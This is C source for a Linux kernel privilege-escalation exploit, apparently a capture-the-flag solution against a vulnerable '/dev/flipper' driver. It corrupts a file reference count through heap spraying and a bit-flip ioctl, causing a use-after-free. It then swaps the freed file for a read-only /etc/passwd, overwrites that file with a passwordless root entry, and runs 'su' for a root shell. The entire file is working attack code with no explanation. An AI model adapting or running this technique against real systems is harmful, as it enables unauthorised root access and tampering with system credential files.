#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/ptrace.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/user.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <syscall.h>
#include <unistd.h>
#include <sys/timerfd.h>

#define COLOR_GREEN "\033[32m"
#define COLOR_RED "\033[31m"
#define COLOR_YELLOW "\033[33m"
#define COLOR_DEFAULT "\033[0m"

#define logd(fmt, ...) \
    dprintf(2, "[*] %s:%d " fmt "\n", __FILE__, __LINE__, ##__VA_ARGS__)
#define logi(fmt, ...)                                                    \
    dprintf(2, COLOR_GREEN "[+] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define logw(fmt, ...)                                                     \
    dprintf(2, COLOR_YELLOW "[!] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define loge(fmt, ...)                                                  \
    dprintf(2, COLOR_RED "[-] %s:%d " fmt "\n" COLOR_DEFAULT, __FILE__, \
            __LINE__, ##__VA_ARGS__)
#define die(fmt, ...)                      \
    do {                                   \
        loge(fmt, ##__VA_ARGS__);          \
        loge("Exit at line %d", __LINE__); \
        exit(1);                           \
    } while (0)


#define o(x) (kbase + x)


unsigned long user_cs, user_ss, user_eflags, user_sp, user_ip;

void get_shell() {
    int uid;
    if (!(uid = getuid())) {
        logi("root get!!");
        execl("/bin/sh", "sh", NULL);
    } else {
        die("gain root failed, uid: %d", uid);
    }
}

void saveStatus(void) {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_eflags;"
            );

    user_ip = (uint64_t)&get_shell;
    user_sp = 0xf000 +
              (uint64_t)mmap(0, 0x10000, 6, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
}

void bind_cpu(int cpu_idx) {
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu_idx, &my_set);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &my_set)) {
        die("sched_setaffinity: %m");
    }
}

void hexdump(const void *data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        dprintf(2, "%02X ", ((unsigned char *)data)[i]);
        if (((unsigned char *)data)[i] >= ' ' &&
            ((unsigned char *)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char *)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i + 1) % 8 == 0 || i + 1 == size) {
            dprintf(2, " ");
            if ((i + 1) % 16 == 0) {
                dprintf(2, "|  %s \n", ascii);
            } else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    dprintf(2, " ");
                }
                for (j = (i + 1) % 16; j < 16; ++j) {
                    dprintf(2, "   ");
                }
                dprintf(2, "|  %s \n", ascii);
            }
        }
    }
}

#define SYSCHK(x) ({              \
    typeof(x) __res = (x);        \
    if (__res == (typeof(x))-1)   \
        die("SYSCHK error."); \
    __res;                        \
})

size_t kbase;
char *r00t = "root::0:0:root:/root:/bin/sh\n";

int fds[0x1000];
int tfile[0x1000];
char buf[0x1000];
int timers[0x1000];
int pipefd[2];
int pipe2fd[2];

#define NUM_SPRAY_FD 0xd00
#define NUM_SPRAY_TIMER 0xf00

#define CMD_ALLOC 0x13370000
#define CMD_FLIP  0x13370001

int main()
{
    saveStatus();
    int i, victim_fd = -1;
    int fd = open("/dev/flipper", O_RDONLY);
    if(fd < 0) perror("Error open");

    system("echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA > /tmp/A");
    SYSCHK(pipe(pipefd));
	SYSCHK(pipe(pipe2fd));

    // simple & stupid heap shaping
    for(i=0; i < NUM_SPRAY_TIMER; i++)
        timers[i] = timerfd_create(CLOCK_REALTIME, 0);
    for(i=NUM_SPRAY_TIMER-1; i >= 0x200; i--)
        close(timers[i]);

    sleep(1);
    ioctl(fd, CMD_ALLOC, 0x100);
    for(i=0; i < NUM_SPRAY_FD; i++) {
        fds[i] = open("/tmp/A", O_RDWR);
        lseek(fds[i], 0x18, SEEK_SET);
    }

    if(fork() == 0) { // f_count 0b01 -> 0b10
        sleep(100000);exit(0);
    } 

    if(fork() == 0) { // f_count 0b10 -> 0b11
        read(pipefd[0], buf, 1); // wait notif from parent
        for(i=0; i<NUM_SPRAY_FD; i++)
            close(fds[i]);
        sleep(1);
        for(i=0; i < NUM_SPRAY_FD; i++) {
            fds[i] = open("/tmp/A", O_RDWR);
            lseek(fds[i], 0x9, SEEK_SET);
        }  

        write(pipe2fd[1], buf, 1); // send notif to parent
        read(pipefd[0], buf, 1); // wait notif from parent

        for(i=0; i<NUM_SPRAY_FD; i++) {
            if(lseek(fds[i], 0, SEEK_CUR) == 0x0) {
                logi("(child) found victim_fd: %d", fds[i]);
                victim_fd = fds[i];
                continue;
            }
            if(i%2) close(fds[i]);
        }
        close(victim_fd);
        sleep(1);
        for(i=0; i < NUM_SPRAY_FD; i++) { // replace victim_fd with passwd
            fds[i] = open("/etc/passwd", O_RDONLY);
        }
        write(pipe2fd[1], buf, 1); // send notif to parent
        sleep(100000);exit(0); 
    }

    getchar(); // debug
    ioctl(fd, CMD_FLIP, 0x1000*8+0x38*8+1); // flip f_count 0b11 -> 0b01

    write(pipefd[1], buf, 1); // start freeing and reallocate hacked fd
    read(pipe2fd[0], buf, 1); // wait child finish

    for(i=0; i < NUM_SPRAY_FD; i++) {
        int seek = lseek(fds[i], 0, SEEK_CUR);
        if(seek == 0x9) {
            logi("(parent) found victim_fd: %d", fds[i]);
            lseek(fds[i], 0x0, SEEK_SET);
            victim_fd = fds[i];
            break;
        }
    }
	char *data = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, victim_fd, 0);
    SYSCHK(data);

    close(victim_fd); // close /tmp/A
    write(pipefd[1], buf, 1); // start spray /etc/passwd
    read(pipe2fd[0], buf, 1); // wait spray finish
  	logd("writing to readonly file");
	strcpy(data, r00t);
    logd("done?");
    system("su");
}